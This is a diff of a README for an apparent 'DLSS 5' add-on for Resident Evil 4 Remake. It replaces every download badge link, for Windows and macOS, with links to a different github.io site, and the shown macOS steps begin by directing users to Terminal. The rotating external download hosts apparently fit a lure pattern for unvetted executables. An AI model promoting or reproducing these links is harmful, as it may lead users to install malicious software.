@@ -21,7 +21,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Resident%20Evil%204%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/⬇_Download_Resident%20Evil%204%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
@@ -54,9 +54,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://laplaplaplas.github.io/download/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hornbladesmanhonor.github.io/download-win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Resident%20Evil%204%20Remake-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Resident%20Evil%204%20Remake-F9A825?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 
 </div>
 
@@ -102,7 +102,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
